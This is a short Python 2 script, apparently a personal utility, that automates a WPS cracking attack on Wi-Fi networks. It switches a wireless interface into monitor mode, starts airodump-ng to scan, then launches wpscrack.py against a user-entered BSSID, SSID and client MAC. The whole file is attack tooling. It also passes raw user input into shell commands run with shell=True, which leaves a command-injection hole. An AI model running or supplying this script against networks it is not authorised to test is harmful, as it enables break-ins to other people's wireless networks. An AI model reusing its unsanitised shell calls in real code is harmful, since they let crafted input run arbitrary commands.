import subprocess

print "Automation tool for wpscrack by Zarkopafilis"
print ""
print "> ifconfig"
out = subprocess.check_output("ifconfig")
print out
print "> airmon-ng"
out = subprocess.check_output("airmon-ng")
print out
interface = raw_input("Enter interface > ")
x = raw_input("Set to monitor mode > ")
print "Shutting " + interface + "down..."
out = subprocess.check_output("ifconfig " + interface + " down" , shell=True)
print "Setting monitor mode..."
out = subprocess.check_output("iwconfig " + interface + " mode monitor", shell=True)
print "Bringing " + interface + "up"
out = subprocess.check_output("ifconfig " + interface + " up", shell=True)
print "All good"
x = raw_input("Start airodump-ng > ")
cmd = "airodump-ng " + interface
print "> " + cmd
subprocess.check_output("gnome-terminal -x sh -c '" + cmd + "; exec bash'" , shell=True)
bssid = raw_input("Enter BSSID > ")
ssid = raw_input("Enter SSID > ")
client_mac = raw_input("Enter client mac > ")
cmd = "python wpscrack.py --client " + client_mac + " -b " + bssid + " --ssid " + ssid + " -v"
print "> " + cmd
subprocess.check_output("gnome-terminal -x sh -c '" + cmd + "; exec bash'" , shell=True)
